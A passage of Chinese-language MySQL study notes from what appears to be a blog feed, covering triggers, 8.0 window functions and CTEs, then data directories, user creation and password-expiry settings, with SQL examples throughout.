<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 方式1：查看当前数据库的所有触发器的定义</span></span><br><span class="line"><span class="keyword">SHOW</span> TRIGGERS\G</span><br><span class="line"><span class="comment">-- 方式2：查看当前数据库中某个触发器的定义</span></span><br><span class="line"><span class="keyword">SHOW</span> <span class="keyword">CREATE</span> <span class="keyword">TRIGGER</span> 触发器</span><br><span class="line"><span class="comment">-- 方式3：从系统库information_schema的TRIGGERS表中查询“salary_check_trigger”触发器的信息。</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> information_schema.TRIGGERS;</span><br></pre></td></tr></table></figure>

<p><strong>删除触发器</strong><br>触发器也是数据库对象，删除触发器也用DROP语句，语法格式如下：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">DROP</span> <span class="keyword">TRIGGER</span> IF <span class="keyword">EXISTS</span> 触发器名称;</span><br></pre></td></tr></table></figure>

<h3 id="触发器的优缺点"><a href="#触发器的优缺点" class="headerlink" title="触发器的优缺点"></a>触发器的优缺点</h3><p><strong>优点</strong></p>
<ol>
<li>触发器可以确保数据的完整性。</li>
<li>触发器可以帮助我们记录操作日志</li>
<li>触发器还可以用在操作数据前，对数据进行合法性检查。</li>
</ol>
<p><strong>缺点</strong></p>
<ol>
<li>触发器最大的一个问题就是可读性差</li>
<li>相关数据的变更，可能会导致触发器出错，如数据表结构的变化等。由于触发器本身的隐蔽性，影响到应用中错误原因排查的效率。</li>
</ol>
<p><strong>注意点</strong><br>如果在子表中定义了外键约束，并且外键指定了<code>ON UPDATE/DELETE CASCADE/SET NULL</code>子句，此时修改父表被引用的键值或删除父表被引用的记录行时，也会引起子表的修改和删除操作，此时基于子表的UPDATE和DELETE语句定义的触发器并不会被激活。</p>
<p>例如：基于子表员工表（t_employee）的DELETE语句定义了触发器t1，而子表的部门编号（did）字段定义了外键约束引用了父表部门表（t_department）的主键列部门编号（did），并且该外键加了“ONDELETE SET NULL”子句，那么如果此时删除父表部门表（t_department）在子表员工表（t_employee）有匹配记录的部门记录时，会引起子表员工表（t_employee）匹配记录的部门编号（did）修改为NULL但是此时不会激活触发器t1。只有直接对子表员工表（t_employee）执行DELETE语句时才会激活触发器<br>t1。</p>
<h2 id="8-0其他新特性"><a href="#8-0其他新特性" class="headerlink" title="8.0其他新特性"></a>8.0其他新特性</h2><p>新增特性：<br>更简便的NoSQL支持、更好的索引、更完善的JSON支持、安全和账户管理、InnoDB的变化、数据字典、原子数据定义语句、资源管理、字符集支持、优化器增强、公用表表达式、窗口函数、正则表达式支持、内部临时表、日志记录、备份锁、增强的MySQL复制</p>
<p>删除特性的领域：<br>查询缓存、部分加密操作、部分空间函数、\N视为NULL、mysql_install_db、通用分区处理程序、通用分区处理程序、mysql_plugin工具</p>
<h3 id="窗口函数"><a href="#窗口函数" class="headerlink" title="窗口函数"></a>窗口函数</h3><p>窗口函数的作用类似于在查询中对数据进行分组，不同的是，分组操作会把分组的结果聚合成一条记录，而窗口函数是将结果置于每一条数据记录中。<br>窗口函数可以分为<code>静态窗口函数</code>和<code>动态窗口函数</code>。</p>
<ul>
<li>静态窗口函数的窗口大小是固定的，不会因为记录的不同而不同；</li>
<li>动态窗口函数的窗口大小会随着记录的不同而变化。</li>
</ul>
<p><a href="https://dev.mysql.com/doc/refman/8.0/en/window-function-descriptions.html#function_row-number">MySQL窗口函数官方参考网页</a></p>
<p>窗口函数总体上可以分为序号函数、分布函数、前后函数、首尾函数和其他函数，如下表：<br><img src="https://raw.githubusercontent.com/Fushiye/Alldocuments/main/img_blog/20240808212056.png" alt="窗口函数"></p>
<h4 id="语法结构"><a href="#语法结构" class="headerlink" title="语法结构"></a>语法结构</h4><p><code>函数 OVER（[PARTITION BY 字段名 ORDER BY 字段名 ASC|DESC]）</code><br>或<br><code>函数 OVER 窗口名 … WINDOW 窗口名 AS （[PARTITION BY 字段名 ORDER BY 字段名 ASC|DESC]）</code></p>
<p>说明：</p>
<ul>
<li>OVER关键字指定函数窗口的范围。<ul>
<li>如果省略后面括号中的内容，则窗口会包含满足WHERE条件的所有记录，窗口函数会基于所有满足WHERE条件的记录进行计算。</li>
<li>如果OVER关键字后面的括号不为空，则可以使用如下语法设置窗口。</li>
</ul>
</li>
<li>窗口名：为窗口设置一个别名，用来标识窗口。</li>
<li>PARTITION BY子句：指定窗口函数按照哪些字段进行分组。分组后，窗口函数可以在每个分组中分别执行。</li>
<li>ORDER BY子句：指定窗口函数按照哪些字段进行排序。执行排序操作使窗口函数按照排序后的数据记录的顺序进行编号。</li>
<li>FRAME子句：为分区中的某个子集定义规则，可以用来作为滑动窗口使用</li>
</ul>
<h4 id="序号函数"><a href="#序号函数" class="headerlink" title="序号函数"></a>序号函数</h4><p><strong>ROW_NUMBER()</strong></p>
<p>ROW_NUMBER()函数能够对数据中的序号进行顺序显示。</p>
<p>示例：查询 goods 数据表中每个商品分类下价格降序排列的各个商品信息。(此时价格一致但序号仍有大小)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">ROW_NUMBER</span>() <span class="keyword">OVER</span>(<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price <span class="keyword">DESC</span>) <span class="keyword">AS</span> row_num,id, category_id, category, NAME, price, stock <span class="keyword">FROM</span> goods;</span><br></pre></td></tr></table></figure>


<p><strong>RANK()函数</strong></p>
<p>使用RANK()函数能够对序号进行并列排序，并且会跳过重复的序号，比如序号为1、1、3。</p>
<p>举例：使用RANK()函数获取goods数据表中各类别的价格从高到低排序的各商品信息。(此时价格一致则序号相同)</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">RANK</span>() <span class="keyword">OVER</span>(<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price <span class="keyword">DESC</span>) <span class="keyword">AS</span> rank_num ,id, category_id,category, NAME, price, stock <span class="keyword">FROM</span> goods;</span><br><span class="line"><span class="comment">-- 当两价格相同，则其序号相同，更低价格的为当前相同价格的商品序号+相同价格商品数</span></span><br></pre></td></tr></table></figure>


<p><strong>DENSE_RANK()函数</strong></p>
<p>DENSE_RANK()函数对序号进行并列排序，并且不会跳过重复的序号，比如序号为1、1、2。</p>
<p>举例：使用DENSE_RANK()函数获取 goods 数据表中各类别的价格从高到低排序的各商品信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">DENSE_RANK</span>() <span class="keyword">OVER</span>(<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price <span class="keyword">DESC</span>) <span class="keyword">AS</span> rank_num ,id, category_id,category, NAME, price, stock <span class="keyword">FROM</span> goods;</span><br><span class="line"><span class="comment">-- 当两价格相同，则其序号相同，更低价格的为当前相同价格的商品序号 + 1</span></span><br></pre></td></tr></table></figure>

<h4 id="分布函数"><a href="#分布函数" class="headerlink" title="分布函数"></a>分布函数</h4><p><strong>PERCENT_RANK()函数</strong></p>
<p>PERCENT_RANK()函数是等级值百分比函数。按照如下方式进行计算。<br><code>(rank - 1) / (rows - 1)</code><br>其中，rank的值为使用RANK()函数产生的序号，rows的值为当前窗口的总记录数。</p>
<p>举例：计算 goods 数据表中名称为“女装&#x2F;女士精品”的类别下的商品的PERCENT_RANK值。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="built_in">RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> r, <span class="built_in">PERCENT_RANK</span>() <span class="keyword">OVER</span> w <span class="keyword">AS</span> pr, id, category_id, category, NAME, price, stock</span><br><span class="line"><span class="keyword">FROM</span> goods <span class="keyword">WHERE</span> category_id <span class="operator">=</span> <span class="number">1</span> <span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price <span class="keyword">DESC</span>);</span><br><span class="line"><span class="comment">-- 适合用于计算成绩分布</span></span><br></pre></td></tr></table></figure>

<table>
<thead>
<tr>
<th>函数类别</th>
<th>函数名</th>
<th>函数功能</th>
<th>备注</th>
</tr>
</thead>
<tbody><tr>
<td>分布函数</td>
<td>CUME_DIST()</td>
<td>主要用于查询小于或等于某个值的比例。</td>
<td></td>
</tr>
<tr>
<td>前后函数</td>
<td>LAG(expr,n)</td>
<td>返回当前行的前n行的expr的值</td>
<td></td>
</tr>
<tr>
<td>前后函数</td>
<td>LEAD(expr,n)</td>
<td>返回当前行的后n行的expr的值。</td>
<td></td>
</tr>
<tr>
<td>首尾函数</td>
<td>FIRST_VALUE(expr)</td>
<td>返回第一个expr的值。</td>
<td></td>
</tr>
<tr>
<td>首尾函数</td>
<td>LAST_VALUE(expr)</td>
<td>返回最后一个expr的值</td>
<td></td>
</tr>
<tr>
<td>其他函数</td>
<td>NTH_VALUE(expr,n)</td>
<td>返回第n个expr的值。</td>
<td></td>
</tr>
<tr>
<td>其他函数</td>
<td>NTILE(n)</td>
<td>将分区中的有序数据分为n堆，记录堆编号。</td>
<td></td>
</tr>
</tbody></table>
<p>示例</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- CUME_DIST() 查询goods数据表中小于或等于当前价格的比例</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">CUME_DIST</span>() <span class="keyword">OVER</span>(<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price <span class="keyword">ASC</span>) <span class="keyword">AS</span> cd,</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> id, category, NAME, price</span><br><span class="line"><span class="operator">-</span><span class="operator">&gt;</span> <span class="keyword">FROM</span> goods</span><br><span class="line"><span class="comment">-- LAG(expr,n) 查询goods数据表中前一个商品价格与当前商品价格的差值</span></span><br><span class="line"><span class="comment">-- LEAD(expr,n) 查询goods数据表中后一个商品价格与当前商品价格的差值。</span></span><br><span class="line"><span class="keyword">SELECT</span> id, category, NAME, behind_price, price,behind_price <span class="operator">-</span> price <span class="keyword">AS</span> diff_price</span><br><span class="line"><span class="keyword">FROM</span>( <span class="keyword">SELECT</span> id, category, NAME, price,<span class="built_in">LEAD</span>(price, <span class="number">1</span>) <span class="keyword">OVER</span> w <span class="keyword">AS</span> behind_price <span class="keyword">FROM</span> goods <span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price)) t;</span><br><span class="line"><span class="comment">-- FIRST_VALUE(expr) 按照价格排序，查询第1个商品的价格信息。</span></span><br><span class="line"><span class="keyword">SELECT</span> id, category, NAME, price, stock,<span class="built_in">FIRST_VALUE</span>(price) <span class="keyword">OVER</span> w <span class="keyword">AS</span> first_price <span class="keyword">FROM</span> goods <span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price);</span><br><span class="line"><span class="comment">-- LAST_VALUE(expr) 按照价格排序，查询最后一个商品的价格信息。</span></span><br><span class="line"><span class="keyword">SELECT</span> id, category, NAME, price, stock,<span class="built_in">LAST_VALUE</span>(price) <span class="keyword">OVER</span> w <span class="keyword">AS</span> last_price <span class="keyword">FROM</span> goods <span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price)</span><br><span class="line"><span class="comment">-- NTH_VALUE(expr,n) 查询goods数据表中排名第2和第3的价格信息</span></span><br><span class="line"><span class="keyword">SELECT</span> id, category, NAME, price,<span class="built_in">NTH_VALUE</span>(price,<span class="number">2</span>) <span class="keyword">OVER</span> w <span class="keyword">AS</span> second_price,<span class="built_in">NTH_VALUE</span>(price,<span class="number">3</span>) <span class="keyword">OVER</span> w <span class="keyword">AS</span> third_price <span class="keyword">FROM</span> goods <span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price)</span><br><span class="line"><span class="comment">-- NTILE(n) 将goods表中的商品按照价格分为3组</span></span><br><span class="line"><span class="keyword">SELECT</span> <span class="built_in">NTILE</span>(<span class="number">3</span>) <span class="keyword">OVER</span> w <span class="keyword">AS</span> nt,id, category, NAME, price <span class="keyword">FROM</span> goods <span class="keyword">WINDOW</span> w <span class="keyword">AS</span> (<span class="keyword">PARTITION</span> <span class="keyword">BY</span> category_id <span class="keyword">ORDER</span> <span class="keyword">BY</span> price);</span><br></pre></td></tr></table></figure>

<h3 id="公用表表达式"><a href="#公用表表达式" class="headerlink" title="公用表表达式"></a>公用表表达式</h3><p>公用表表达式（或通用表表达式）简称为CTE（Common Table Expressions）。CTE是一个命名的临时结果集，作用范围是当前语句。CTE可以理解成一个可以复用的子查询，当然跟子查询还是有点区别的，CTE可以引用其他CTE，但子查询不能引用其他子查询。所以，可以考虑代替子查询。<br>依据语法结构和执行方式的不同，公用表表达式分为<code>普通公用表表达式</code>和 递归公用表表达式&#96;2 种</p>
<h4 id="普通公用表表达式"><a href="#普通公用表表达式" class="headerlink" title="普通公用表表达式"></a>普通公用表表达式</h4><p>语法结构:<br>   <code>WITH CTE名称 AS （子查询）SELECT|DELETE|UPDATE 语</code></p>
<p>普通公用表表达式类似于子查询，不过，跟子查询不同的是，它可以被多次引用，而且可以被其他的普通公用表表达式所引用。<br>举例：查询员工所在的部门的详细信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> departments <span class="keyword">WHERE</span> department_id <span class="keyword">IN</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> department_id <span class="keyword">FROM</span> employees);</span><br><span class="line"><span class="comment">--等价于公用表表达式：</span></span><br><span class="line"><span class="keyword">WITH</span> emp_dept_id <span class="keyword">AS</span> (<span class="keyword">SELECT</span> <span class="keyword">DISTINCT</span> department_id <span class="keyword">FROM</span> employees) <span class="keyword">SELECT</span> <span class="operator">*</span> <span class="keyword">FROM</span> departments d <span class="keyword">JOIN</span> emp_dept_id e <span class="keyword">ON</span> d.department_id <span class="operator">=</span> e.department_id</span><br></pre></td></tr></table></figure>

<h4 id="递归公用表表达式"><a href="#递归公用表表达式" class="headerlink" title="递归公用表表达式"></a>递归公用表表达式</h4><p>递归公用表表达式可以调用自己<br>语法结构：<br>   <code>WITH RECURSIVE CTE名称 AS （子查询）SELECT|DELETE|UPDATE 语句;</code><br>递归公用表表达式由 2 部分组成，分别是种子查询和递归查询，中间通过关键字 UNION [ALL]进行连接。<br>这里的种子查询，意思就是获得递归的初始值。这个查询只会运行一次，以创建初始数据集，之后递归查询会一直执行，直到没有任何新的查询数据产生，递归返回</p>
<p>示例：employees表包含employee_id，last_name和manager_id三个字段。如果a是b的管理者，那么，我们可以把b叫做a的下属，如果同时b又是c的管理者，那么c就是b的下属，是a的下下属。用查询语句列出所有具有下下属身份的人员信息。</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">WITH</span> <span class="keyword">RECURSIVE</span> cte</span><br><span class="line"><span class="keyword">AS</span></span><br><span class="line">(</span><br><span class="line">   <span class="keyword">SELECT</span> employee_id,last_name,manager_id,<span class="number">1</span> <span class="keyword">AS</span> n <span class="keyword">FROM</span> employees <span class="keyword">WHERE</span> employee_id <span class="operator">=</span> <span class="number">100</span></span><br><span class="line"><span class="comment">-- 种子查询，找到第一代领导</span></span><br><span class="line"><span class="keyword">UNION</span> <span class="keyword">ALL</span></span><br><span class="line"><span class="comment">-- 递归查询，找出以递归公用表表达式的人为领导的人</span></span><br><span class="line"><span class="keyword">SELECT</span> a.employee_id,a.last_name,a.manager_id,n<span class="operator">+</span><span class="number">1</span> <span class="keyword">FROM</span> employees <span class="keyword">AS</span> a <span class="keyword">JOIN</span> cte <span class="keyword">ON</span> (a.manager_id <span class="operator">=</span> cte.employee_id) </span><br><span class="line">)</span><br><span class="line"><span class="keyword">SELECT</span> employee_id,last_name <span class="keyword">FROM</span> cte <span class="keyword">WHERE</span> n <span class="operator">&gt;=</span> <span class="number">3</span>;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>


<h2 id="关键字及其含义"><a href="#关键字及其含义" class="headerlink" title="关键字及其含义"></a>关键字及其含义</h2><p><code>SELECT</code> - 用于从数据库表中选取数据。它允许你指定你想从表中检索的列。<br><code>FROM</code> - 指定了SELECT语句中要查询的表名。<br><code>WHERE</code> - 用于指定过滤条件，以限制SELECT语句返回的行。<br><code>INSERT INTO</code> - 用于向数据库表中插入新的行。<br><code>UPDATE</code> - 用于修改表中的数据。它必须配合SET子句来指定要修改的列和新值，以及WHERE子句来指定哪些行需要被更新。<br><code>DELETE</code>- 用于从数据库表中删除行。它可以与WHERE子句结合使用，以限制删除哪些行。<br><code>CREATE TABLE</code> - 用于创建一个新表，并定义其列和每列的数据类型。<br><code>ALTER TABLE</code> - 用于修改已存在的表的结构，如添加、删除或修改列。<br><code>DROP TABLE</code> - 用于删除整个表及其所有数据。<br><code>TRUNCATE TABLE</code> - 用于删除表中的所有行，但不删除表本身。与DELETE相比，它通常更快，因为它不记录个别行删除的日志。<br><code>JOIN</code> - 用于根据两个或多个表中的列之间的关系，结合这些表的数据。常见的JOIN类型有INNER JOIN、LEFT JOIN、RIGHT JOIN和FULL JOIN。<br><code>GROUP BY</code> - 通常与聚合函数（如COUNT、MAX、MIN、SUM、AVG）一起使用，用于将结果集中的行分组。<br><code>HAVING</code> - 用于对GROUP BY的结果进行过滤，类似于WHERE子句，但它是用于聚合后的结果。<br><code>ORDER BY</code> - 用于对结果集进行排序。可以指定一个或多个列进行升序（ASC）或降序（DESC）排序。<br><code>DISTINCT</code> - 用于返回唯一不同的值。<br><code>UNION</code> - 用于合并两个或多个SELECT语句的结果集，并删除重复的行。<br><code>UNION ALL</code> - 类似于UNION，但它不删除重复的行。<br><code>COUNT()、MAX()、MIN()、SUM()、AVG()</code> - 这些是聚合函数，用于在SELECT语句中对一组值执行计算并返回单个值。<br><code>LIKE</code> - 在WHERE子句中用于在模糊匹配中搜索列中的指定模式。<br><code>IN</code> - 在WHERE子句中用于指定多个可能的值，以便从中选择。<br><code>IFNULL</code> - </p>
<h2 id="杂谈"><a href="#杂谈" class="headerlink" title="杂谈"></a>杂谈</h2><h3 id="抛出错误"><a href="#抛出错误" class="headerlink" title="抛出错误"></a>抛出错误</h3><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 用于存储过程和函数、触发器 45000可换为其他错误码</span></span><br><span class="line">SIGNAL <span class="keyword">SQLSTATE</span> <span class="string">&#x27;45000&#x27;</span> <span class="keyword">SET</span> MESSAGE_TEXT <span class="operator">=</span> <span class="string">&#x27;自定义错误消息&#x27;</span>;  </span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>缓存与数据库</category>
        <category>MySQL</category>
      </categories>
      <tags>
        <tag>MySQL</tag>
      </tags>
  </entry>
  <entry>
    <title>MySQL-Note2-架构索引调优</title>
    <url>/2024/09/07/MySQL-Note2-%E6%9E%B6%E6%9E%84%E7%B4%A2%E5%BC%95%E8%B0%83%E4%BC%98/</url>
    <content><![CDATA[<p>参考资料：<br><a href="https://mysql.net.cn/doc/refman/8.0/en/">MySQL中文文档</a><br><a href="https://www.bilibili.com/video/BV1iq4y1u7vj?p=96">MySQL高级篇-尚硅谷</a></p>
<h1 id="MySQL架构"><a href="#MySQL架构" class="headerlink" title="MySQL架构"></a>MySQL架构</h1><h2 id="Linux中MySQL的数据目录"><a href="#Linux中MySQL的数据目录" class="headerlink" title="Linux中MySQL的数据目录"></a>Linux中MySQL的数据目录</h2><h3 id="MySQL的数据目录"><a href="#MySQL的数据目录" class="headerlink" title="MySQL的数据目录"></a>MySQL的数据目录</h3><p>数据库存放路径：<code>/var/lib/mysql</code></p>
<h3 id="InnoDB"><a href="#InnoDB" class="headerlink" title="InnoDB"></a>InnoDB</h3><p>数据与索引一同</p>
<p><strong>MySQL5.7</strong><br>数据库存放路径下存有默认数据库和创建的数据库同名的文件夹。数据库文件夹中会有文件：<code>db.opt</code>,<code>表名.frm</code>,<code>表名.idb</code>。<br><code>db.opt</code>：存放本数据库使用的字符集、比较规则等<br><code>表名.frm</code>：存储对应表的结构<br><code>表名.idb</code>：（独立表空间）5.5.6后表中的数据默认存储在此文件中。（表中数据也可能存储在上层目录中的ibdata1（系统表空间，初始12M）文件中）<br>视图没有对应idb文件–&gt;没有自己的数据</p>
<p><strong>MySQL8.0</strong>后frm文件的改为sdi文件，不再提供opt文件</p>
<h3 id="MyISBM"><a href="#MyISBM" class="headerlink" title="MyISBM"></a>MyISBM</h3><p>数据与索引分开存储</p>
<p><strong>MySQL5.7</strong><br>数据库存放路径下存有默认数据库和创建的数据库同名的文件夹。数据库文件夹中会有文件：<code>db.opt</code>,<code>表名.frm</code>,<code>表名.MYD</code>,<code>表名.MYI</code>。<br><code>db.opt</code>：存放本数据库使用的字符集、比较规则等<br><code>表名.frm</code>：存储对应表的结构<br><code>表名.MYD</code>：存储数据<br><code>表名.MYI</code>：存储索引，与<code>表名.MYD</code>一起相当于innodb中的<code>表名.idb</code></p>
<h2 id="用户和权限管理"><a href="#用户和权限管理" class="headerlink" title="用户和权限管理"></a>用户和权限管理</h2><p>注意：角色、用户应当尽可能使用全名如<code>userName@hostName</code>,<code>roleName@hostName</code>;</p>
<h3 id="用户的创建和管理"><a href="#用户的创建和管理" class="headerlink" title="[!] 用户的创建和管理"></a>[!] 用户的创建和管理</h3><p>MySQL中的初始用户，可在表mysql&#x2F;user（主键为host,user联合）中查看，包括mysql.infoschema、mysql.session、mysql.sys、root</p>
<p>创建用户：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">create</span> <span class="keyword">user</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;host&#x27;</span> [identified <span class="keyword">by</span> <span class="string">&#x27;password&#x27;</span>][,<span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;host&#x27;</span> [IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;passwd&#x27;</span>]];</span><br><span class="line"><span class="comment">-- host为主机名，%表示任何主机，localhost表示本机;[]为可选参数</span></span><br></pre></td></tr></table></figure>

<p>修改用户(不建议)：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="keyword">UPDATE</span> mysql.user <span class="keyword">SET</span> <span class="keyword">USER</span><span class="operator">=</span><span class="string">&#x27;newname&#x27;</span> <span class="keyword">WHERE</span> <span class="keyword">USER</span><span class="operator">=</span><span class="string">&#x27;oldname&#x27;</span>;</span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>

<p>删除用户：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 方法1 推荐，完全删除</span></span><br><span class="line"><span class="keyword">DROP</span> <span class="keyword">USER</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;hostname&#x27;</span>[,<span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;hostname&#x27;</span>]…;</span><br><span class="line"><span class="comment">-- 方法2 不建议，有残余文件</span></span><br><span class="line"><span class="keyword">DELETE</span> <span class="keyword">FROM</span> mysql.user <span class="keyword">WHERE</span> Host<span class="operator">=</span><span class="string">&#x27;hostname&#x27;</span> <span class="keyword">AND</span> <span class="keyword">User</span><span class="operator">=</span><span class="string">&#x27;username&#x27;</span></span><br><span class="line">FLUSH PRIVILEGES;</span><br></pre></td></tr></table></figure>


<h3 id="用户密码管理"><a href="#用户密码管理" class="headerlink" title="[!] 用户密码管理"></a>[!] 用户密码管理</h3><h4 id="设置当前用户密码"><a href="#设置当前用户密码" class="headerlink" title="设置当前用户密码"></a>设置当前用户密码</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.（推荐） 使用ALTER USER命令来修改当前用户密码 </span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="keyword">USER</span>() IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;new_password&#x27;</span>;</span><br><span class="line"><span class="comment">-- 2.（不推荐）使用SET语句来修改当前用户密码</span></span><br><span class="line"><span class="keyword">SET</span> PASSWORD<span class="operator">=</span><span class="string">&#x27;new_password&#x27;</span>;</span><br><span class="line"><span class="comment">-- 3.（不推荐）MySQL5.7使用SET语句来修改当前用户密码</span></span><br><span class="line"><span class="keyword">SET</span> PASSWORD <span class="operator">=</span> PASSWORD(<span class="string">&#x27;123456&#x27;</span>);</span><br></pre></td></tr></table></figure>

<h4 id="设置其他用户密码"><a href="#设置其他用户密码" class="headerlink" title="设置其他用户密码"></a>设置其他用户密码</h4><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 1.（推荐） 使用ALTER USER命令来修改用户密码 </span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;hostname&#x27;</span> IDENTIFIED <span class="keyword">BY</span> <span class="string">&#x27;new_password&#x27;</span>;</span><br><span class="line"><span class="comment">-- 2.（不推荐）使用SET语句来修改普通用户密码</span></span><br><span class="line"><span class="keyword">SET</span> PASSWORD <span class="keyword">FOR</span> <span class="string">&#x27;username&#x27;</span>@<span class="string">&#x27;hostname&#x27;</span><span class="operator">=</span><span class="string">&#x27;new_password&#x27;</span>;</span><br><span class="line"><span class="comment">-- 3.（不推荐）使用UPDATE语句修改普通用户的密码 </span></span><br><span class="line"><span class="keyword">UPDATE</span> MySQL.user <span class="keyword">SET</span> authentication_string <span class="operator">=</span> PASSWORD(&quot;newpasswd&quot;) <span class="keyword">WHERE</span> <span class="keyword">User</span> <span class="operator">=</span> &quot;username&quot; <span class="keyword">AND</span> Host <span class="operator">=</span> &quot;hostname&quot;;</span><br></pre></td></tr></table></figure>


<h4 id="MySQL密码管理-过期和重用"><a href="#MySQL密码管理-过期和重用" class="headerlink" title="MySQL密码管理-过期和重用"></a>MySQL密码管理-过期和重用</h4><h5 id="密码过期策略"><a href="#密码过期策略" class="headerlink" title="密码过期策略"></a>密码过期策略</h5><p>在MySQL中，数据库管理员可以<code>手动设置</code>账号密码过期，也可以建立一个<code>自动密码过期策略</code>。过期策略可以是<code>全局的</code>，也可以为<code>每个账号</code>设置单独的过期策略。</p>
<p>全局过期设置：</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 方法1 使用SQL语句更改该变量的值并持久化</span></span><br><span class="line"><span class="keyword">SET</span> PERSIST default_password_lifetime <span class="operator">=</span> <span class="number">180</span>; <span class="comment">-- 建立全局策略，设置密码每隔180天过期</span></span><br><span class="line"><span class="comment">-- 方法2 配置文件my.cnf中进行维护</span></span><br><span class="line">[mysqld]</span><br><span class="line">default_password_lifetime<span class="operator">=</span><span class="number">180</span> <span class="comment">-- 建立全局策略，设置密码每隔180天过期</span></span><br></pre></td></tr></table></figure>

<p>单独用户过期设置:</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="comment">-- 设置kangshifu账号密码每90天过期：</span></span><br><span class="line"><span class="keyword">CREATE</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD EXPIRE <span class="type">INTERVAL</span> <span class="number">90</span> <span class="keyword">DAY</span>;</span><br><span class="line"><span class="comment">-- 或</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD EXPIRE <span class="type">INTERVAL</span> <span class="number">90</span> <span class="keyword">DAY</span>;</span><br><span class="line"><span class="comment">-- 永不过期：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD EXPIRE NEVER;</span><br><span class="line"><span class="comment">-- 延用全局密码过期策略：</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD EXPIRE <span class="keyword">DEFAULT</span>;</span><br><span class="line"><span class="comment">-- 立即过期</span></span><br><span class="line"><span class="keyword">ALTER</span> <span class="keyword">USER</span> <span class="string">&#x27;kangshifu&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> PASSWORD EXPIRE;</span><br></pre></td></tr></table></figure>

<h5 id="密码重用策略"><a href="#密码重用策略" class="headerlink" title="密码重用策略"></a>密码重用策略</h5><p>限制用户不能设置最近使用过的密码</p>
<p>全局设置</p>
